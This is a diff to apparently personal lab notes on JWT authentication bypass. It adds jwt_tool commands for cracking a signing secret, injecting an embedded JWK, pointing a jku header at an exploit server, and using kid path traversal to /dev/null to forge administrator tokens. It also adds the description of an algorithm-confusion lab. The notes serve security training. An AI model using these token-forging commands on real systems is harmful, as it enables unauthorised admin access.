@@ -77,6 +77,13 @@ hashcat -a 0 -m 16500 your-JWT wt.secrets.list
 - Select `Don't modify header`
 - Copy that JWT and GET request to `/admin`
 
+### With jwt_tool
+```sh
+❯ python jwt_tool.py $jwt -C  -d jwt.secrets.list 
+❯ python jwt_tool.py $jwt -T -S hs256 -p "secret1" 
+# follow the menu to change the payloads
+```
+
 ---
 
 ## Lab - 4: JWT authentication bypass via jwk header injection (P)
@@ -90,6 +97,14 @@ hashcat -a 0 -m 16500 your-JWT wt.secrets.list
 - change the payload to administrator
 - `Attack` > Embedded JWK > choose that was generated before in signing key > OK
 - copy the JWT and send with /admin request
+
+### With jwt_tool
+
+- in ~/.jwt_tool/jwtconf.int, change the `jwks_kid` parameter to value from jwt
+
+```sh
+❯ python jwt_tool.py $jwt -I -hc kid -hv 73c9f5d0-adfb-4c82-ba6c-c622cd1bfcd7 -pc sub -pv administrator -X i
+```
 
 ---
 
@@ -141,6 +156,18 @@ hashcat -a 0 -m 16500 your-JWT wt.secrets.list
 - Make sure `Don't modify header` checked
 - copy the token and send with this token
 
+### With jwt_tool 
+
+- in the exploit body , store the result from 
+```sh
+❯ cat ~/.jwt_tool/jwttool_custom_jwks.json 
+```
+- change the `kid` value to original value
+
+```sh
+❯ python jwt_tool.py $jwt -I -pc sub -pv administrator -X s -ju https://exploit-0ab900d803503da7c05070d501b60025.exploit-server.net/exploit
+```
+
 ---
 
 ## Lab - 6: JWT authentication bypass via kid header path traversal (P)
@@ -172,4 +199,14 @@ hashcat -a 0 -m 16500 your-JWT wt.secrets.list
 - sign to the previous generated token
 - copy the token
 
+### With jwt_tool
+
+```sh
+❯ python jwt_tool.py $jwt -I -hc kid -hv ../../../../../../dev/null -pc sub -pv administrator -S hs256
+```
+
 ---
+
+##  Lab - 7: JWT authentication bypass via algorithm confusion (E)
+
+This lab uses a JWT-based mechanism for handling sessions. It uses a robust RSA key pair to sign and verify tokens. However, due to implementation flaws, this mechanism is vulnerable to algorithm confusion attacks. To solve the lab, first obtain the server's public key. This is exposed via a standard endpoint. Use this key to sign a modified session token that gives you access to the admin panel at `/admin`, then delete the user `carlos`. You can log in to your own account using the following credentials: `wiener:peter`
